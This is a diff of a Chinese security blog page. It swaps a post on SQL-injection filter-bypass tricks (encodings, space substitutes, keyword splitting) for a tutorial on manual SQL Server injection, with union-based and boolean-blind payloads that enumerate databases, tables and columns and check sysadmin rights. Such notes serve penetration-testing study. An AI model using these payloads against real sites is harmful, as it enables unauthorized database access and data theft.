@@ -19,29 +19,29 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+    <meta name="description" content="server手工注入用户权限sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限and 1&#x3D;(is_srvrolemember(‘sysadmin’))  &#x2F;&#x2F;返回正常为sadb权限：文件管理，数据库操作等and 1&#x3D;(is_member(‘db_owner’))  &#x2F;&#x2F;返回正常值为DB_OWNERpublic权限：数据库操作and 1&#x3D;(is_srvrolemember(‘pub">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入之bypass技巧">
-<meta property="og:url" content="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:title" content="sql 手工注入">
+<meta property="og:url" content="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="The future is promising">
-<meta property="og:description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+<meta property="og:description" content="server手工注入用户权限sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限and 1&#x3D;(is_srvrolemember(‘sysadmin’))  &#x2F;&#x2F;返回正常为sadb权限：文件管理，数据库操作等and 1&#x3D;(is_member(‘db_owner’))  &#x2F;&#x2F;返回正常值为DB_OWNERpublic权限：数据库操作and 1&#x3D;(is_srvrolemember(‘pub">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-11T09:06:37.000Z">
-<meta property="article:modified_time" content="2023-01-11T10:00:02.193Z">
+<meta property="article:published_time" content="2023-01-13T07:38:34.000Z">
+<meta property="article:modified_time" content="2023-01-13T11:19:13.582Z">
 <meta property="article:author" content="清者">
 <meta property="article:tag" content="拼搏">
 <meta property="article:tag" content="奋斗">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+<link rel="canonical" href="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/","path":"2023/01/11/sql注入之bypass技巧/","title":"sql注入之bypass技巧"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/","path":"2023/01/13/sql手工注入/","title":"sql 手工注入"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sql注入之bypass技巧 | The future is promising</title>
+<title>sql 手工注入 | The future is promising</title>
   
 
 
@@ -141,7 +141,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">绕过常见方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">1.1.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.2.</span> <span class="nav-text">空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E5%AD%97%E7%AC%A6%E4%BB%A5%E5%8F%8A%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">等价字符以及等价函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E7%89%B9%E6%80%A7"><span class="nav-number">1.5.</span> <span class="nav-text">mysql特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86"><span class="nav-number">1.6.</span> <span class="nav-text">关键字拆分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">1.7.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.8.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="nav-number">1.9.</span> <span class="nav-text">判断列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.10.</span> <span class="nav-text">联合查询</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#server%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">server手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-number">1.1.</span> <span class="nav-text">用户权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">一般步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,7 +202,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/apple-touch-icon-next.png">
@@ -215,12 +215,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="sql注入之bypass技巧 | The future is promising">
+      <meta itemprop="name" content="sql 手工注入 | The future is promising">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sql注入之bypass技巧
+          sql 手工注入
         </h1>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-01-11 17:06:37 / 修改时间：18:00:02" itemprop="dateCreated datePublished" datetime="2023-01-11T17:06:37+08:00">2023-01-11</time>
+      <time title="创建时间：2023-01-13 15:38:34 / 修改时间：19:19:13" itemprop="dateCreated datePublished" datetime="2023-01-13T15:38:34+08:00">2023-01-13</time>
     </span>
 
   
@@ -245,16 +245,9 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="绕过常见方式"><a href="#绕过常见方式" class="headerlink" title="绕过常见方式"></a>绕过常见方式</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#,–,– -,–+,//,/**/,/<em>letmetest</em>/,;%00</p>
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>可以代替空格的字符<br>/**/,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等<br>还可以使用<br>+,-,~,.等<br>例如:union+select+1,2</p>
-<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>hex编码，URL编码，宽字节，Unicode编码(iis支持)<br>URL编码:%6f%72%20%31%3d%31(and 1=1)<br>Unicode编码:un%u0069on</p>
-<h3 id="等价字符以及等价函数"><a href="#等价字符以及等价函数" class="headerlink" title="等价字符以及等价函数"></a>等价字符以及等价函数</h3><p>and==&gt;&amp;&amp;<br>or==&gt;||<br>xor==&gt;^<br>not==&gt;!<br>hex(),bin()==&gt;ascii()<br>concat_ws()==&gt;group_concat()<br>sleep()==&gt;benchmark()<br>mid(),substr()==&gt;substring()<br>@@user==&gt;user()<br>@@datadir==&gt;datadir()</p>
-<h3 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h3><p>mysql中=为等于的意思,只有在update中是赋值<br>:=  赋值<br>@   @加变量名可以直接调用</p>
-<h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><p>se’+’le’+’ct’<br>%S%E%L%E%C%T1<br>U/**/NION</p>
-<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>/<em>!Unlon</em>/</p>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>and 1=1,and ‘a’=’a’,and 1(and 0),and hex(1),and hex(0),and !,/<em>!1</em>/,/<em>!0</em>/,and–+a%0a1/<em>!=</em>/0</p>
-<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p>order by 20 (后面加数字)</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>union select 1,2,3,……,得到的列数<br>之后便可以替换掉其中的数字来获取想要的信息</p>
+        <h2 id="server手工注入"><a href="#server手工注入" class="headerlink" title="server手工注入"></a>server手工注入</h2><h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限<br>and 1=(is_srvrolemember(‘sysadmin’))  //返回正常为sa<br>db权限：文件管理，数据库操作等<br>and 1=(is_member(‘db_owner’))  //返回正常值为DB_OWNER<br>public权限：数据库操作<br>and 1=(is_srvrolemember(‘public’))  //public权限较低</p>
+<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><p>name为所查东西的名称<br>判断注入点是否存在<br>sql i.aspx?id=1’  (报错)/‘-  -  (正常)/‘ and 1=1-  -  (正常)/‘ and 1&gt;1-  -  (空)<br>判断字段数<br>order by<br>联合查询获得系统信息<br>union select<br>获取当前数据库名<br>sql i.aspx?id=-1’ union select null,db_name(0),null–<br>?id=-1’ union select null,null,name from sys.databases where name != ‘master’ –<br>获取其他数据库名<br>sql i.aspx?id=-1’ union select null,db_name(1),null–<br>sql i.aspx?id=-1’ union select null,db_name(2),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 0 name from sys. databases)),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 1 name from sys. databases)),null–<br>获取当前数据表名<br>sql i.aspx?id=-1 union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’–<br>获取其他数据表名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’–<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’ and name !=’article’–<br>获取数据表中的一个字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)–<br>获取其他字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>判断是不是sql server数据库<br>?id=1 and exists(select * from sysobjects)<br>?id=1 and exists(select count(<em>) from sysobjects)<br>判断数据库版本信息<br>?id=1’ and substring((select @@version),22,4)=2008–<br>判断数据库用户<br>?id=1’ and 1=(is_srvrolemember(‘sysadmin’))–<br>判断数据库名称的长度<br>?id=1’ and len(db_name())=4 –<br>判断数据库名称<br>?id=1’ and ascii(substring(db_name(),1,1))&gt;97 –<br>?id=1’ and ascii(substring(db_name(),1,1))=116 –<br>?id=1’ and ascii(substring(db_name(),2,1))=101 –<br>判断数据表的数量<br>?id=1’ and (select count(</em>) from test..sysobjects where xtype=’U’)=3–<br>判断第一个数据表的名称的长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’)=5–<br>判断第二个数据表的名称长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’ and name!=’users’)=7–<br>判断数据表名称的第一个字符<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..sysobjects where xtype=’U’)=117–<br>判断数据表中列的数量<br>?id=1’ and (select top 1 count(*) from test..syscolumns where id=OBJECT_ID(‘users’))=3–<br>判断数据表中第一个字段的长度<br>?id=1’ and (select top 1 len(name) from test..syscolumns where id=OBJECT_ID(‘users’))=2–<br>判断数据表中第一个字段的名称<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..syscolumns where id=OBJECT_ID(‘users’))=105–<br>(判断第二个后面加上and name!=’id’)<br>此外还有时间盲注</p>
 
     </div>
 
@@ -272,14 +265,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/12/16/hello-world/" rel="prev" title="Hello World">
-                  <i class="fa fa-chevron-left"></i> Hello World
+                <a href="/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/" rel="prev" title="sql注入之bypass技巧">
+                  <i class="fa fa-chevron-left"></i> sql注入之bypass技巧
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" rel="next" title="sql 手工注入">
-                  sql 手工注入 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
